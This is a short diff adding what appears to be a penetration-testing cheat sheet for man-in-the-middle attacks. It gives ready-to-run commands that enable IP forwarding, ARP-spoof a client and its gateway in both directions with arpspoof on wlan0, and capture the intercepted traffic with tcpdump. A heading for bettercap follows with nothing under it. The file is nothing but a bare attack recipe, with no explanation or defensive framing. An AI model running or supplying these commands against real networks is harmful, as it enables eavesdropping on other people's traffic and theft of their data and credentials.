@@ -1,0 +1,9 @@
+# MiTM
+
+# Arp Spoofing (arpspoof)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i wlan0 -t $clientIP $gatewayIP
+arpspoof -i wlan0 -t $gatewayIP $clientIP
+tcpdump -i wlan0
+
+# Arp Spoofing (bettercap)
